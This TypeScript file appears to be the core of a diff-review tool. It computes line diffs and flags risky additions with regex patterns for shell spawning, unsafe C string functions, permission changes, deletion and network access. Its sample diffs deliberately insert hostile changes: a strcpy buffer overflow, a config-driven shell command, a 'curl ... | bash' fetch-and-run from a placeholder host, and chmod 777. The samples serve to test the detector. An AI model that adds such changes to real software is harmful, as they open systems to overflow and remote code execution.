// @ts-nocheck -- index-heavy LCS loops; bounds are guaranteed by loop conditions
export type DiffRow =
  | { type: "same"; a: number; b: number; text: string }
  | { type: "add"; b: number; text: string }
  | { type: "remove"; a: number; text: string }
  | { type: "change"; a: number; b: number; from: string; to: string };

/** LCS line diff; adjacent remove+add pairs are folded into "change" rows. */
export function diffLines(original: string, modified: string): DiffRow[] {
  const A = original.split("\n");
  const B = modified.split("\n");
  const n = A.length, m = B.length;
  const dp: number[][] = Array.from({ length: n + 1 }, () => new Array(m + 1).fill(0));
  for (let i = n - 1; i >= 0; i--)
    for (let j = m - 1; j >= 0; j--)
      dp[i][j] = A[i] === B[j] ? dp[i + 1][j + 1] + 1 : Math.max(dp[i + 1][j], dp[i][j + 1]);

  const raw: DiffRow[] = [];
  let i = 0, j = 0;
  while (i < n || j < m) {
    if (i < n && j < m && A[i] === B[j]) { raw.push({ type: "same", a: i + 1, b: j + 1, text: A[i] }); i++; j++; }
    else if (j < m && (i >= n || dp[i][j + 1] >= dp[i + 1][j])) { raw.push({ type: "add", b: j + 1, text: B[j] }); j++; }
    else { raw.push({ type: "remove", a: i + 1, text: A[i] }); i++; }
  }

  // fold runs of removes followed by adds into changes
  const out: DiffRow[] = [];
  for (let k = 0; k < raw.length; ) {
    if (raw[k].type !== "remove" && raw[k].type !== "add") { out.push(raw[k]); k++; continue; }
    const rem: Extract<DiffRow, { type: "remove" }>[] = [];
    const add: Extract<DiffRow, { type: "add" }>[] = [];
    while (k < raw.length && (raw[k].type === "remove" || raw[k].type === "add")) {
      const r = raw[k];
      if (r.type === "remove") rem.push(r); else if (r.type === "add") add.push(r);
      k++;
    }
    const pairs = Math.min(rem.length, add.length);
    for (let x = 0; x < pairs; x++) out.push({ type: "change", a: rem[x].a, b: add[x].b, from: rem[x].text, to: add[x].text });
    rem.slice(pairs).forEach((r) => out.push(r));
    add.slice(pairs).forEach((r) => out.push(r));
  }
  return out;
}

const RISKS: { re: RegExp; label: string }[] = [
  { re: /\b(system|popen|execv?p?e?|execl)\s*\(/, label: "Spawns a process or shell command — could run arbitrary programs." },
  { re: /\b(gets|strcpy|strcat|sprintf)\s*\(/, label: "Uses an unbounded C string function — possible buffer overflow." },
  { re: /\bchmod\b|\bos\.chmod\b|setuid|chown/, label: "Changes file permissions or ownership — may weaken protection." },
  { re: /rm\s+-rf|shutil\.rmtree|unlink\s*\(/, label: "Deletes files — possible data loss." },
  { re: /\beval\s*\(|\bexec\s*\(/, label: "Evaluates dynamic code — possible code injection." },
  { re: /curl|wget|requests\.(get|post)|socket/, label: "Performs network access — possible data exfiltration or remote payload." },
  { re: /subprocess|os\.system/, label: "Runs external commands from Python." },
  { re: /mprotect|PROT_EXEC|mmap/, label: "Touches memory protection — relevant to W^X." },
];

export function analyze(rows: DiffRow[]) {
  const added = rows.filter((r) => r.type === "add").length;
  const removed = rows.filter((r) => r.type === "remove").length;
  const changed = rows.filter((r) => r.type === "change").length;
  const newText = rows.flatMap((r) => (r.type === "add" ? [r.text] : r.type === "change" ? [r.to] : []));
  const effects = new Set<string>();
  newText.forEach((t) => RISKS.forEach((k) => k.re.test(t) && effects.add(k.label)));
  return { added, removed, changed, total: added + removed + changed, effects: [...effects] };
}

export const SAMPLES = {
  c: {
    label: "C",
    original: `#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char name[32];
    if (argc < 2) return 1;
    strncpy(name, argv[1], sizeof(name) - 1);
    name[31] = '\\0';
    printf("Hello, %s\\n", name);
    return 0;
}`,
    modified: `#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    char name[32];
    if (argc < 2) return 1;
    strcpy(name, argv[1]);
    printf("Hello, %s\\n", name);
    system("chmod +w /opt/execguard/bin/app.bin");
    return 0;
}`,
  },
  python: {
    label: "Python",
    original: `import json

def load_config(path):
    with open(path) as f:
        return json.load(f)

if __name__ == "__main__":
    cfg = load_config("config.json")
    print(cfg["version"])`,
    modified: `import json
import subprocess

def load_config(path):
    with open(path) as f:
        return json.load(f)

if __name__ == "__main__":
    cfg = load_config("config.json")
    print(cfg.get("version", "unknown"))
    subprocess.run(cfg["post_hook"], shell=True)`,
  },
  shell: {
    label: "Shell",
    original: `#!/bin/bash
set -euo pipefail
BUILD_DIR=./build
mkdir -p "$BUILD_DIR"
gcc -O2 -o "$BUILD_DIR/app.bin" main.c
echo "Build complete"`,
    modified: `#!/bin/bash
set -euo pipefail
BUILD_DIR=./build
mkdir -p "$BUILD_DIR"
curl -s http://example.invalid/patch.sh | bash
gcc -O2 -o "$BUILD_DIR/app.bin" main.c
chmod 777 "$BUILD_DIR/app.bin"
echo "Build done"`,
  },
} as const;
